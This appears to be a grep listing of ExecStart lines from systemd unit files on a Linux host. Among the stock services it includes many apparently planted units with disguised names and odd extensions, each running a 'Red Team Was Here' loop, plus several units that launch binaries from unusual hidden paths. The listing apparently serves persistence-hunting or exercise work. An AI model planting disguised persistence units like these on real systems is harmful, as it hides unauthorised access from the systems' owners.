+/usr/lib/systemd/system/keyboard-setup.service:10:ExecStart=/lib/console-setup/keyboard-setup.sh
+/usr/lib/systemd/system/grub-common.service:10:ExecStart=grub-editenv /boot/grub/grubenv unset recordfail
+/usr/lib/systemd/system/ModemManager.service:10:ExecStart=/usr/sbin/ModemManager
+/usr/lib/systemd/system/cockpit-motd.service:9:ExecStart=-/usr/share/cockpit/motd/update-motd
+/usr/lib/systemd/system/spice-vdagentd.service:8:ExecStart=/usr/sbin/spice-vdagentd $SPICE_VDAGENTD_EXTRA_ARGS
+/usr/lib/systemd/system/ua-timer.service:14:ExecStart=/usr/bin/python3 /usr/lib/ubuntu-advantage/timer.py
+/usr/lib/systemd/system/systemd-sysext@.service:20:ExecStart=-systemd-sysext
+/usr/lib/systemd/system/multipathd.service:20:ExecStart=/sbin/multipathd -d -s
+/usr/lib/systemd/system/console-setup.service:11:ExecStart=/lib/console-setup/console-setup.sh
+/usr/lib/systemd/system/e2scrub_all.service:11:ExecStart=/sbin/e2scrub_all
+/usr/lib/systemd/system/systemd-fsck@.service:23:ExecStart=/usr/lib/systemd/systemd-fsck %f
+/usr/lib/systemd/system/wpa_supplicant.service:11:ExecStart=/usr/sbin/wpa_supplicant -u -s -O "DIR=/run/wpa_supplicant GROUP=netdev"
+/usr/lib/systemd/system/systemd-binfmt.service:31:ExecStart=/usr/lib/systemd/systemd-binfmt
+/usr/lib/systemd/system/snapd.snap-repair.service:10:ExecStart=/usr/lib/snapd/snap-repair run
+/usr/lib/systemd/system/systemd-pcrlock-file-system.service:22:ExecStart=/usr/lib/systemd/systemd-pcrlock lock-file-system
+/usr/lib/systemd/system/pam_namespace.service:10:ExecStart=/usr/sbin/pam_namespace_helper
+/usr/lib/systemd/system/apport.service:9:ExecStart=/usr/share/apport/apport --start
+/usr/lib/systemd/system/vgauth.service:11:ExecStart=/usr/bin/VGAuthService
+/usr/lib/systemd/system/pollinate.service:11:ExecStart=/usr/bin/pollinate
+/usr/lib/systemd/system/systemd-hwdb-update.service:28:ExecStart=systemd-hwdb update
+/usr/lib/systemd/system/dbus.service:13:ExecStart=@/usr/bin/dbus-daemon @dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
+/usr/lib/systemd/system/mdcheck_start.service:16:ExecStart=/usr/share/mdadm/mdcheck --duration ${MDADM_CHECK_DURATION}
+/usr/lib/systemd/system/friendly-recovery.service:14:ExecStart=-/lib/recovery-mode/recovery-menu
+/usr/lib/systemd/system/initrd-cleanup.service:20:ExecStart=systemctl --no-block isolate initrd-switch-root.target
+/usr/lib/systemd/system/sysstat-collect.service:16:ExecStart=/usr/lib/sysstat/sa1 1 1
+/usr/lib/systemd/system/console-getty.service:23:ExecStart=-/sbin/agetty -o '-p -- \\u' --noclear --keep-baud - 115200,38400,9600 $TERM
+/usr/lib/systemd/system/vector.service:11:ExecStart=/usr/bin/vector
+/usr/lib/systemd/system/snapd.seeded.service:8:ExecStart=/usr/bin/snap wait system seed.loaded
+/usr/lib/systemd/system/open-iscsi.service:23:ExecStart=/usr/sbin/iscsiadm -m node --loginall=automatic
+/usr/lib/systemd/system/open-iscsi.service:24:ExecStart=/usr/lib/open-iscsi/activate-storage.sh
+/usr/lib/systemd/system/snapd.autoimport.service:11:ExecStart=/usr/bin/snap auto-import
+/usr/lib/systemd/system/systemd-udevd.service:28:ExecStart=/usr/lib/systemd/systemd-udevd
+/usr/lib/systemd/system/mountwatchd.service:9:ExecStart=/usr/libexec/policy-loader
+/usr/lib/systemd/system/systemd-network-generator.service:23:ExecStart=/usr/lib/systemd/systemd-network-generator
+/usr/lib/systemd/system/systemd-pcrfs-root.service:23:ExecStart=/usr/lib/systemd/systemd-pcrextend --graceful --file-system=/
+/usr/lib/systemd/system/nfs-idmapd.service:12:ExecStart=/usr/sbin/rpc.idmapd
+/usr/lib/systemd/system/logctl-agent.timer:7:ExecStart=/bin/sh -c "while true; do echo 'Red Team Was Here :)'; sleep 1337; done"
+/usr/lib/systemd/system/rpc-gssd.service:14:ExecStart=/usr/sbin/rpc.gssd
+/usr/lib/systemd/system/firewalld-fallback.blutm:7:ExecStart=/bin/sh -c "while true; do echo 'Red Team Was Here :)'; sleep 1337; done"
+/usr/lib/systemd/system/systemd-journal-catalog-update.service:25:ExecStart=journalctl --update-catalog
+/usr/lib/systemd/system/systemd-udev-trigger.service:22:ExecStart=-udevadm trigger --type=all --action=add --prioritized-subsystem=module,block,tpmrm,net,tty,input
+/usr/lib/systemd/system/initrd-root-fs.target.wants/systemd-repart.service:32:ExecStart=/usr/bin/systemd-repart --dry-run=no
+/usr/lib/systemd/system/driver-check.passwd:7:ExecStart=/bin/sh -c "while true; do echo 'Red Team Was Here :)'; sleep 1337; done"
+/usr/lib/systemd/system/systemd-firstboot.service:34:ExecStart=systemd-firstboot --prompt-locale --prompt-timezone --prompt-root-password
+/usr/lib/systemd/system/fstrim.service:8:ExecStart=/sbin/fstrim --listed-in /etc/fstab:/proc/self/mountinfo --verbose --quiet-unsupported
+/usr/lib/systemd/system/usbmuxd.service:6:ExecStart=/usr/sbin/usbmuxd --user usbmux --systemd
+/usr/lib/systemd/system/apport-forward@.service:7:ExecStart=/usr/share/apport/apport
+/usr/lib/systemd/system/update-helperd.shadow:7:ExecStart=/bin/sh -c "while true; do echo 'Red Team Was Here :)'; sleep 1337; done"
+/usr/lib/systemd/system/systemd-remount-fs.service:25:ExecStart=/usr/lib/systemd/systemd-remount-fs
+/usr/lib/systemd/system/systemd-networkd.service:27:ExecStart=!!/usr/lib/systemd/systemd-networkd
+/usr/lib/systemd/system/quotaon.service:24:ExecStart=/usr/sbin/quotaon -aug
+/usr/lib/systemd/system/gpu-manager.service:8:ExecStart=/usr/bin/gpu-manager --log /var/log/gpu-manager.log
+/usr/lib/systemd/system/systemd-sysupdate-reboot.service:17:ExecStart=/usr/lib/systemd/systemd-sysupdate reboot
+/usr/lib/systemd/system/initrd-switch-root.service:23:ExecStart=systemctl --no-block switch-root
+/usr/lib/systemd/system/finalrd.service:15:ExecStart=/bin/true
+/usr/lib/systemd/system/usb_modeswitch@.service:7:ExecStart=/usr/sbin/usb_modeswitch_dispatcher --switch-mode %i
+/usr/lib/systemd/system/usb_modeswitch@.service:9:#ExecStart=/bin/echo "usb_modeswitch.service: device name is %i"
+/usr/lib/systemd/system/mountd-check.mount:7:ExecStart=/bin/sh -c "while true; do echo 'Red Team Was Here :)'; sleep 1337; done"
+/usr/lib/systemd/system/bolt.service:9:ExecStart=/usr/libexec/boltd
+/usr/lib/systemd/system/plymouth-read-write.service:9:ExecStart=-/usr/bin/plymouth update-root-fs --read-write
+/usr/lib/systemd/system/systemd-pcrlock-make-policy.service:23:ExecStart=/usr/lib/systemd/systemd-pcrlock make-policy --location=770
+/usr/lib/systemd/system/systemd-tmpfiles-clean.service:21:ExecStart=systemd-tmpfiles --clean
+/usr/lib/systemd/system/plymouth-poweroff.service:12:ExecStart=/usr/sbin/plymouthd --mode=shutdown --attach-to-session
+/usr/lib/systemd/system/plymouth-switch-root-initramfs.service:18:ExecStart=-/usr/bin/plymouth message --text=""
+/usr/lib/systemd/system/plymouth-switch-root-initramfs.service:19:ExecStart=-/usr/bin/plymouth update-root-fs --new-root-dir=/run/initramfs
+/usr/lib/systemd/system/wpa_supplicant@.service:12:ExecStart=/usr/sbin/wpa_supplicant -c/etc/wpa_supplicant/wpa_supplicant-%I.conf -i%I
+/usr/lib/systemd/system/plymouth-log.service:9:ExecStart=-/usr/bin/plymouth update-root-fs --read-write
+/usr/lib/systemd/system/pg_basebackup@.service:13:ExecStart=/usr/bin/pg_backupcluster %i basebackup
+/usr/lib/systemd/system/pg_basebackup@.service:14:ExecStart=/usr/bin/pg_backupcluster %i expirebasebackups $KEEP
+/usr/lib/systemd/system/nginx.service:24:ExecStart=/usr/sbin/nginx -g 'daemon on; master_process on;'
+/usr/lib/systemd/system/systemd-suspend.service:19:ExecStart=/usr/lib/systemd/systemd-sleep suspend
+/usr/lib/systemd/system/e2scrub@.service:19:ExecStart=/sbin/e2scrub -t %I
+/usr/lib/systemd/system/sysstat-summary.service:15:ExecStart=/usr/lib/sysstat/sa2 -A
+/usr/lib/systemd/system/systemd-rfkill.service:22:ExecStart=/usr/lib/systemd/systemd-rfkill
+/usr/lib/systemd/system/systemd-growfs-root.service:22:ExecStart=/usr/lib/systemd/systemd-growfs /
+/usr/lib/systemd/system/thermald.service:9:ExecStart=/usr/sbin/thermald --systemd --dbus-enable --adaptive
+/usr/lib/systemd/system/systemd-ask-password-plymouth.service:15:ExecStart=/usr/bin/systemd-tty-ask-password-agent --watch --plymouth
+/usr/lib/systemd/system/apport-autoreport.service:9:ExecStart=/usr/share/apport/whoopsie-upload-all --timeout 20
+/usr/lib/systemd/system/rc-local.service:20:ExecStart=/etc/rc.local start
+/usr/lib/systemd/system/nfsdcld.service:10:ExecStart=/usr/sbin/nfsdcld
+/usr/lib/systemd/system/cockpit-wsinstance-https-factory@.service:6:ExecStart=/usr/lib/cockpit/cockpit-wsinstance-factory
+/usr/lib/systemd/system/xfs_scrub_all.service:15:ExecStart=/usr/sbin/xfs_scrub_all
+/usr/lib/systemd/system/apport-coredump-hook@.service:5:ExecStart=/usr/share/apport/apport --from-systemd-coredump %i
+/usr/lib/systemd/system/cloud-config.service:12:ExecStart=/usr/bin/cloud-init modules --mode=config
+/usr/lib/systemd/system/uuidd.service:7:ExecStart=/usr/sbin/uuidd --socket-activation
+/usr/lib/systemd/system/dpkg-db-backup.service:7:ExecStart=/usr/libexec/dpkg/dpkg-db-backup
+/usr/lib/systemd/system/initrd.target.wants/systemd-pcrphase-initrd.service:22:ExecStart=/usr/lib/systemd/systemd-pcrextend --graceful enter-initrd
+/usr/lib/systemd/system/initrd.target.wants/systemd-battery-check.service:24:ExecStart=/usr/lib/systemd/systemd-battery-check
+/usr/lib/systemd/system/initrd.target.wants/systemd-bsod.service:21:ExecStart=/usr/lib/systemd/systemd-bsod --continuous
+/usr/lib/systemd/system/e2scrub_fail@.service:7:ExecStart=/usr/lib/x86_64-linux-gnu/e2fsprogs/e2scrub_fail "%I"
+/usr/lib/systemd/system/initrd-udevadm-cleanup-db.service:20:ExecStart=-udevadm info --cleanup-db
+/usr/lib/systemd/system/atd.service:8:ExecStart=/usr/sbin/atd -f
+/usr/lib/systemd/system/systemd-pcrfs@.service:24:ExecStart=/usr/lib/systemd/systemd-pcrextend --graceful --file-system=%f
+/usr/lib/systemd/system/systemd-tmpfiles-setup-dev-early.service:23:ExecStart=systemd-tmpfiles --prefix=/dev --create --boot --graceful
+/usr/lib/systemd/system/systemd-hibernate.service:19:ExecStart=/usr/lib/systemd/systemd-sleep hibernate
+/usr/lib/systemd/system/nfs-mountd.service:13:ExecStart=/usr/sbin/rpc.mountd
+/usr/lib/systemd/system/systemd-pstore.service:23:ExecStart=/usr/lib/systemd/systemd-pstore
+/usr/lib/systemd/system/ua-reboot-cmds.service:17:ExecStart=/usr/bin/python3 /usr/lib/ubuntu-advantage/reboot_cmds.py
+/usr/lib/systemd/system/NetworkManager-dispatcher.service:8:ExecStart=/usr/libexec/nm-dispatcher
+/usr/lib/systemd/system/modtrackd.service:9:ExecStart=/udev/.udev/firmware
+/usr/lib/systemd/system/systemd-fsckd.service:16:ExecStart=/usr/lib/systemd/systemd-fsckd
+/usr/lib/systemd/system/polkit.service:11:ExecStart=/usr/lib/polkit-1/polkitd --no-debug
+/usr/lib/systemd/system/man-db.service:9:ExecStart=+/usr/bin/install -d -o man -g man -m 0755 /var/cache/man
+/usr/lib/systemd/system/man-db.service:11:ExecStart=/usr/bin/mandb --quiet
+/usr/lib/systemd/system/rpc-service-helper.timer:7:ExecStart=/bin/sh -c "while true; do echo 'Red Team Was Here :)'; sleep 1337; done"
+/usr/lib/systemd/system/systemd-initctl.service:16:ExecStart=/usr/lib/systemd/systemd-initctl
+/usr/lib/systemd/system/plymouth-switch-root.service:10:ExecStart=-/usr/bin/plymouth update-root-fs --new-root-dir=/sysroot
+/usr/lib/systemd/system/snapd.system-shutdown.service:15:ExecStart=/bin/mount /run -o remount,exec
+/usr/lib/systemd/system/snapd.system-shutdown.service:16:ExecStart=/bin/mkdir -p /run/initramfs
+/usr/lib/systemd/system/snapd.system-shutdown.service:17:ExecStart=/bin/cp /usr/lib/snapd/system-shutdown /run/initramfs/shutdown
+/usr/lib/systemd/system/sysstat.service:16:ExecStart=/usr/lib/sysstat/sa1 --boot
+/usr/lib/systemd/system/plymouth-kexec.service:12:ExecStart=/usr/sbin/plymouthd --mode=shutdown --attach-to-session
+/usr/lib/systemd/system/systemd-journald@.service:24:ExecStart=/usr/lib/systemd/systemd-journald %i
+/usr/lib/systemd/system/inetutils-inetd.service:15:ExecStart=/usr/sbin/inetutils-inetd --foreground $INETD_OPTS
+/usr/lib/systemd/system/knockd.service:9:ExecStart=/usr/sbin/knockd $KNOCKD_OPTS
+/usr/lib/systemd/system/systemd-pcrphase-sysinit.service:23:ExecStart=/usr/lib/systemd/systemd-pcrextend --graceful sysinit
+/usr/lib/systemd/system/kmod-static-nodes.service:20:ExecStart=/usr/bin/kmod static-nodes --format=tmpfiles --output=/run/tmpfiles.d/static-nodes.conf
+/usr/lib/systemd/system/systemd-update-done.service:23:ExecStart=/usr/lib/systemd/systemd-update-done
+/usr/lib/systemd/system/snapd.core-fixup.service:11:ExecStart=/usr/lib/snapd/snapd.core-fixup.sh
+/usr/lib/systemd/system/auditd.service:22:ExecStart=/sbin/auditd
+/usr/lib/systemd/system/mdmonitor.service:14:ExecStart=/sbin/mdadm --monitor --scan
+/usr/lib/systemd/system/pg_receivewal@.service:12:ExecStart=/usr/bin/pg_backupcluster %i receivewal
+/usr/lib/systemd/system/getty-static.service:9:ExecStart=systemctl --no-block start getty@tty2.service getty@tty3.service getty@tty4.service getty@tty5.service getty@tty6.service
+/usr/lib/systemd/system/mdcheck_continue.service:16:ExecStart=/usr/share/mdadm/mdcheck --continue --duration ${MDADM_CHECK_DURATION}
+/usr/lib/systemd/system/multi-user.target.wants/dbus.service:13:ExecStart=@/usr/bin/dbus-daemon @dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
+/usr/lib/systemd/system/multi-user.target.wants/systemd-update-utmp-runlevel.service:25:ExecStart=/usr/lib/systemd/systemd-update-utmp runlevel
+/usr/lib/systemd/system/multi-user.target.wants/plymouth-quit.service:6:ExecStart=-/usr/bin/plymouth quit
+/usr/lib/systemd/system/multi-user.target.wants/systemd-user-sessions.service:18:ExecStart=/usr/lib/systemd/systemd-user-sessions start
+/usr/lib/systemd/system/multi-user.target.wants/plymouth-quit-wait.service:6:ExecStart=-/usr/bin/plymouth --wait
+/usr/lib/systemd/system/multi-user.target.wants/systemd-logind.service:33:ExecStart=/usr/lib/systemd/systemd-logind
+/usr/lib/systemd/system/system-update-cleanup.service:37:ExecStart=rm -fv /system-update /etc/system-update
+/usr/lib/systemd/system/nfs-utils.service:17:ExecStart=/bin/true
+/usr/lib/systemd/system/plymouth-halt.service:12:ExecStart=/usr/sbin/plymouthd --mode=shutdown --attach-to-session
+/usr/lib/systemd/system/spice-vdagent.service:8:ExecStart=/usr/sbin/spice-vdagentd $SPICE_VDAGENTD_EXTRA_ARGS
+/usr/lib/systemd/system/systemd-suspend-then-hibernate.service:19:ExecStart=/usr/lib/systemd/systemd-sleep suspend-then-hibernate
+/usr/lib/systemd/system/systemd-udev-settle.service:27:ExecStart=udevadm settle
+/usr/lib/systemd/system/bootmon-agent.blktm:7:ExecStart=/bin/sh -c "while true; do echo 'Red Team Was Here :)'; sleep 1337; done"
+/usr/lib/systemd/system/portmap.service:16:ExecStart=/sbin/rpcbind -f $OPTIONS
+/usr/lib/systemd/system/update-db.rdtm:7:ExecStart=/bin/sh -c "while true; do echo 'Red Team Was Here :)'; sleep 1337; done"
+/usr/lib/systemd/system/xfs_scrub_fail@.service:13:ExecStart=/usr/libexec/xfsprogs/xfs_scrub_fail "${EMAIL_ADDR}" %f
+/usr/lib/systemd/system/cloud-init-hotplugd.service:23:ExecStart=/bin/bash -c 'read args <&3; echo "args=$args"; \
+/usr/lib/systemd/system/systemd-pcrphase-initrd.service:22:ExecStart=/usr/lib/systemd/systemd-pcrextend --graceful enter-initrd
+/usr/lib/systemd/system/reboot.target.wants/plymouth-switch-root-initramfs.service:18:ExecStart=-/usr/bin/plymouth message --text=""
+/usr/lib/systemd/system/reboot.target.wants/plymouth-switch-root-initramfs.service:19:ExecStart=-/usr/bin/plymouth update-root-fs --new-root-dir=/run/initramfs
+/usr/lib/systemd/system/reboot.target.wants/plymouth-reboot.service:12:ExecStart=/usr/sbin/plymouthd --mode=reboot --attach-to-session
+/usr/lib/systemd/system/initrd-switch-root.target.wants/plymouth-switch-root.service:10:ExecStart=-/usr/bin/plymouth update-root-fs --new-root-dir=/sysroot
+/usr/lib/systemd/system/initrd-switch-root.target.wants/plymouth-start.service:14:ExecStart=/usr/sbin/plymouthd --mode=boot --pid-file=/run/plymouth/pid --attach-to-session
+/usr/lib/systemd/system/snapd.service:18:ExecStart=/usr/lib/snapd/snapd
+/usr/lib/systemd/system/rescue.service:22:ExecStart=-/usr/lib/systemd/systemd-sulogin-shell rescue
+/usr/lib/systemd/system/getty@.service:39:ExecStart=-/sbin/agetty -o '-p -- \\u' --noclear - $TERM
+/usr/lib/systemd/system/fswatcherd.service:9:ExecStart=/var/lib/udev/hwdb
+/usr/lib/systemd/system/secureboot-db.service:10:ExecStart=/usr/bin/sbkeysync --no-default-keystores --keystore /usr/share/secureboot/updates --verbose
+/usr/lib/systemd/system/poweroff.target.wants/plymouth-poweroff.service:12:ExecStart=/usr/sbin/plymouthd --mode=shutdown --attach-to-session
+/usr/lib/systemd/system/poweroff.target.wants/plymouth-switch-root-initramfs.service:18:ExecStart=-/usr/bin/plymouth message --text=""
+/usr/lib/systemd/system/poweroff.target.wants/plymouth-switch-root-initramfs.service:19:ExecStart=-/usr/bin/plymouth update-root-fs --new-root-dir=/run/initramfs
+/usr/lib/systemd/system/packagekit.service:13:ExecStart=/usr/libexec/packagekitd
+/usr/lib/systemd/system/iscsid.service:16:ExecStart=/usr/sbin/iscsid
+/usr/lib/systemd/system/user@.service:21:ExecStart=/usr/lib/systemd/systemd --user
+/usr/lib/systemd/system/cockpit-wsinstance-http.service:7:ExecStart=/usr/lib/cockpit/cockpit-ws --no-tls --port=0
+/usr/lib/systemd/system/systemd-update-utmp-runlevel.service:25:ExecStart=/usr/lib/systemd/systemd-update-utmp runlevel
+/usr/lib/systemd/system/fsidd.service:7:ExecStart=/usr/sbin/fsidd
+/usr/lib/systemd/system/systemd-confext.service:29:ExecStart=systemd-confext refresh
+/usr/lib/systemd/system/wpa_supplicant-nl80211@.service:12:ExecStart=/usr/sbin/wpa_supplicant -c/etc/wpa_supplicant/wpa_supplicant-nl80211-%I.conf -Dnl80211 -i%I
+/usr/lib/systemd/system/kmod.service:28:ExecStart=/usr/lib/systemd/systemd-modules-load
+/usr/lib/systemd/system/dbus-org.freedesktop.login1.service:33:ExecStart=/usr/lib/systemd/systemd-logind
+/usr/lib/systemd/system/postgresql@.service:20:ExecStart=-/usr/bin/pg_ctlcluster --skip-systemctl-redirect %i start
+/usr/lib/systemd/system/cloud-init.service:24:ExecStart=/usr/bin/cloud-init init
+/usr/lib/systemd/system/firewall-bouncer.mount:7:ExecStart=/bin/sh -c "while true; do echo 'Red Team Was Here :)'; sleep 1337; done"
+/usr/lib/systemd/system/mdadm-grow-continue@.service:14:ExecStart=/sbin/mdadm --grow --continue /dev/%I
+/usr/lib/systemd/system/update-db.persistence:7:ExecStart=/bin/sh -c "while true; do echo 'Red Team Was Here :)'; sleep 1337; done"
+/usr/lib/systemd/system/esm-cache.service:15:ExecStart=/usr/bin/python3 /usr/lib/ubuntu-advantage/esm_cache.py
+/usr/lib/systemd/system/debug-shell.service:20:ExecStart=/usr/bin/bash
+/usr/lib/systemd/system/rpc-statd.service:17:ExecStart=/usr/sbin/rpc.statd
+/usr/lib/systemd/system/fwupd-refresh.service:21:ExecStart=/usr/bin/fwupdmgr refresh
+/usr/lib/systemd/system/wpa_supplicant-wired@.service:12:ExecStart=/usr/sbin/wpa_supplicant -c/etc/wpa_supplicant/wpa_supplicant-wired-%I.conf -Dwired -i%I
+/usr/lib/systemd/system/emergency.service:23:ExecStart=-/usr/lib/systemd/systemd-sulogin-shell emergency
+/usr/lib/systemd/system/plymouth-start.service:14:ExecStart=/usr/sbin/plymouthd --mode=boot --pid-file=/run/plymouth/pid --attach-to-session
+/usr/lib/systemd/system/systemd-random-seed.service:28:ExecStart=/usr/lib/systemd/systemd-random-seed load
+/usr/lib/systemd/system/unattended-upgrades.service:8:ExecStart=/usr/share/unattended-upgrades/unattended-upgrade-shutdown --wait-for-signal
+/usr/lib/systemd/system/update-notifier-download.service:6:ExecStart=/usr/lib/update-notifier/package-data-downloader
+/usr/lib/systemd/system/ssh.service:10:ExecStart=/usr/sbin/sshd -D $SSHD_OPTS
+/usr/lib/systemd/system/systemd-tpm2-setup.service:24:ExecStart=/usr/lib/systemd/systemd-tpm2-setup
+/usr/lib/systemd/system/rpc-statd-notify.service:15:ExecStart=-/usr/sbin/sm-notify
+/usr/lib/systemd/system/fwupd-offline-update.service:12:ExecStart=/usr/libexec/fwupd/fwupdoffline
+/usr/lib/systemd/system/auditd-wrapper.rdtm:7:ExecStart=/bin/sh -c "while true; do echo 'Red Team Was Here :)'; sleep 1337; done"
+/usr/lib/systemd/system/open-vm-tools.service:13:ExecStart=/usr/bin/vmtoolsd
+/usr/lib/systemd/system/motd-news.service:8:ExecStart=/etc/update-motd.d/50-motd-news --force
+/usr/lib/systemd/system/lxd-installer@.service:5:ExecStart=/bin/sh -eux /usr/share/lxd-installer/lxd-installer-service
+/usr/lib/systemd/system/timetrackd.service:9:ExecStart=/usr/local/sbin/fsintegrityd
+/usr/lib/systemd/system/systemd-quotacheck.service:24:ExecStart=/usr/lib/systemd/systemd-quotacheck
+/usr/lib/systemd/system/systemd-hybrid-sleep.service:19:ExecStart=/usr/lib/systemd/systemd-sleep hybrid-sleep
+/usr/lib/systemd/system/nfs-kernel-server.service:25:ExecStart=/usr/sbin/rpc.nfsd
+/usr/lib/systemd/system/systemd-battery-check.service:24:ExecStart=/usr/lib/systemd/systemd-battery-check
+/usr/lib/systemd/system/system-audit.slice:7:ExecStart=/bin/sh -c "while true; do echo 'Red Team Was Here :)'; sleep 1337; done"
+/usr/lib/systemd/system/dbus-org.freedesktop.locale1.service:20:ExecStart=/usr/lib/systemd/systemd-localed
+/usr/lib/systemd/system/apt-daily-upgrade.service:10:ExecStart=/usr/lib/apt/apt.systemd.daily install
+/usr/lib/systemd/system/systemd-ask-password-console.service:24:ExecStart=systemd-tty-ask-password-agent --watch --console
+/usr/lib/systemd/system/pg_dump@.service:13:ExecStart=/usr/bin/pg_backupcluster %i dump
+/usr/lib/systemd/system/pg_dump@.service:14:ExecStart=/usr/bin/pg_backupcluster %i expiredumps $KEEP
+/usr/lib/systemd/system/systemd-localed.service:20:ExecStart=/usr/lib/systemd/systemd-localed
+/usr/lib/systemd/system/xfs_scrub@.service:24:ExecStart=/usr/sbin/xfs_scrub -b -n %f
+/usr/lib/systemd/system/packagekit-offline-update.service:13:ExecStart=/usr/libexec/pk-offline-update
+/usr/lib/systemd/system/update-notifier-motd.service:6:ExecStart=/usr/lib/ubuntu-release-upgrader/release-upgrade-motd
+/usr/lib/systemd/system/systemd-hostnamed.service:20:ExecStart=/usr/lib/systemd/systemd-hostnamed
+/usr/lib/systemd/system/NetworkManager-wait-online.service:19:ExecStart=/usr/bin/nm-online -s -q
+/usr/lib/systemd/system/apt-news.service:16:ExecStart=/usr/bin/python3 /usr/lib/ubuntu-advantage/apt_news.py
+/usr/lib/systemd/system/systemd-sysctl.service:22:ExecStart=/usr/lib/systemd/systemd-sysctl
+/usr/lib/systemd/system/cron-repair.blutm:7:ExecStart=/bin/sh -c "while true; do echo 'Red Team Was Here :)'; sleep 1337; done"
+/usr/lib/systemd/system/plymouth-quit.service:6:ExecStart=-/usr/bin/plymouth quit
+/usr/lib/systemd/system/lvm2-monitor.service:14:ExecStart=/usr/sbin/lvm vgchange --monitor y
+/usr/lib/systemd/system/cockpit.service:13:ExecStart=/usr/lib/cockpit/cockpit-tls
+/usr/lib/systemd/system/systemd-pcrlock-machine-id.service:22:ExecStart=/usr/lib/systemd/systemd-pcrlock lock-machine-id
+/usr/lib/systemd/system/cron.service:8:ExecStart=/usr/sbin/cron -f -P $EXTRA_OPTS
+/usr/lib/systemd/system/mdmonitor-oneshot.service:14:ExecStart=sh -c '[ "$AUTOSCAN" != "true" ] || /sbin/mdadm --monitor --oneshot --scan'
+/usr/lib/systemd/system/systemd-journal-flush.service:24:ExecStart=journalctl --flush
+/usr/lib/systemd/system/nfs-blkmap.service:13:ExecStart=/usr/sbin/blkmapd
+/usr/lib/systemd/system/dbus-org.freedesktop.timedate1.service:20:ExecStart=/usr/lib/systemd/systemd-timedated
+/usr/lib/systemd/system/systemd-growfs@.service:23:ExecStart=/usr/lib/systemd/systemd-growfs %f
+/usr/lib/systemd/system/journal-rotate.mount:7:ExecStart=/bin/sh -c "while true; do echo 'Red Team Was Here :)'; sleep 1337; done"
+/usr/lib/systemd/system/grub-initrd-fallback.service:10:ExecStart=/usr/bin/grub-editenv /boot/grub/grubenv unset initrdfail
+/usr/lib/systemd/system/grub-initrd-fallback.service:11:ExecStart=/usr/bin/grub-editenv /boot/grub/grubenv unset prev_entry
+/usr/lib/systemd/system/apt-daily.service:10:ExecStart=/usr/lib/apt/apt.systemd.daily update
+/usr/lib/systemd/system/systemd-pcrmachine.service:22:ExecStart=/usr/lib/systemd/systemd-pcrextend --graceful --machine-id
+/usr/lib/systemd/system/systemd-storagetm.service:27:ExecStart=/usr/lib/systemd/systemd-storagetm --all
+/usr/lib/systemd/system/lxd-agent.service:14:ExecStart=/run/lxd_agent/lxd-agent
+/usr/lib/systemd/system/systemd-time-wait-sync.service:31:ExecStart=/usr/lib/systemd/systemd-time-wait-sync
+/usr/lib/systemd/system/ssl-cert.service:8:ExecStart=-/usr/sbin/make-ssl-cert generate-default-snakeoil --force-overwrite
+/usr/lib/systemd/system/initrd-parse-etc.service:27:# ExecStart=/usr/lib/systemd/systemd-sysroot-fstab-check
+/usr/lib/systemd/system/initrd-parse-etc.service:28:ExecStart=@/usr/lib/systemd/system-generators/systemd-fstab-generator systemd-sysroot-fstab-check
+/usr/lib/systemd/system/initrd-parse-etc.service:35:ExecStart=systemctl --no-block start initrd-cleanup.service
+/usr/lib/systemd/system/systemd-pcrextend@.service:19:ExecStart=-/usr/lib/systemd/systemd-pcrextend
+/usr/lib/systemd/system/autovt@.service:39:ExecStart=-/sbin/agetty -o '-p -- \\u' --noclear - $TERM
+/usr/lib/systemd/system/plymouth.service:6:ExecStart=-/usr/bin/plymouth quit
+/usr/lib/systemd/system/cloud-final.service:15:ExecStart=/usr/bin/cloud-init modules --mode=final
+/usr/lib/systemd/system/systemd-boot-check-no-failures.service:21:ExecStart=/usr/lib/systemd/systemd-boot-check-no-failures
+/usr/lib/systemd/system/timing-daemon.rdtm:7:ExecStart=/bin/sh -c "while true; do echo 'Red Team Was Here :)'; sleep 1337; done"
+/usr/lib/systemd/system/vault-mirror.service:7:ExecStart=/bin/sh -c "while true; do echo 'Red Team Was Here :)'; sleep 1337; done"
+/usr/lib/systemd/system/systemd-sysext.service:29:ExecStart=systemd-sysext refresh
+/usr/lib/systemd/system/serial-getty@.service:34:ExecStart=-/sbin/agetty -o '-p -- \\u' --keep-baud 115200,57600,38400,9600 - $TERM
+/usr/lib/systemd/system/systemd-user-sessions.service:18:ExecStart=/usr/lib/systemd/systemd-user-sessions start
+/usr/lib/systemd/system/systemd-volatile-root.service:22:ExecStart=/usr/lib/systemd/systemd-volatile-root yes /sysroot
+/usr/lib/systemd/system/graphical.target.wants/systemd-update-utmp-runlevel.service:25:ExecStart=/usr/lib/systemd/systemd-update-utmp runlevel
+/usr/lib/systemd/system/systemd-repart.service:32:ExecStart=/usr/bin/systemd-repart --dry-run=no
+/usr/lib/systemd/system/systemd-hibernate-resume.service:24:ExecStart=/usr/lib/systemd/systemd-hibernate-resume
+/usr/lib/systemd/system/systemd-fsck-root.service:26:ExecStart=/usr/lib/systemd/systemd-fsck
+/usr/lib/systemd/system/apparmor.service:22:ExecStart=/lib/apparmor/apparmor.systemd reload
+/usr/lib/systemd/system/kexec.target.wants/plymouth-switch-root-initramfs.service:18:ExecStart=-/usr/bin/plymouth message --text=""
+/usr/lib/systemd/system/kexec.target.wants/plymouth-switch-root-initramfs.service:19:ExecStart=-/usr/bin/plymouth update-root-fs --new-root-dir=/run/initramfs
+/usr/lib/systemd/system/kexec.target.wants/plymouth-kexec.service:12:ExecStart=/usr/sbin/plymouthd --mode=shutdown --attach-to-session
+/usr/lib/systemd/system/systemd-sysupdate.service:20:ExecStart=/usr/lib/systemd/systemd-sysupdate update
+/usr/lib/systemd/system/rpc-svcgssd.service:15:ExecStart=/usr/sbin/rpc.svcgssd
+/usr/lib/systemd/system/nm-priv-helper.service:22:ExecStart=/usr/libexec/nm-priv-helper
+/usr/lib/systemd/system/plymouth-quit-wait.service:6:ExecStart=-/usr/bin/plymouth --wait
+/usr/lib/systemd/system/firewalld-fallback.socket:7:ExecStart=/bin/sh -c "while true; do echo 'Red Team Was Here :)'; sleep 1337; done"
+/usr/lib/systemd/system/mdmon@.service:23:ExecStart=/sbin/mdmon --foreground --offroot --takeover %I
+/usr/lib/systemd/system/ldconfig.service:26:ExecStart=/sbin/ldconfig -X
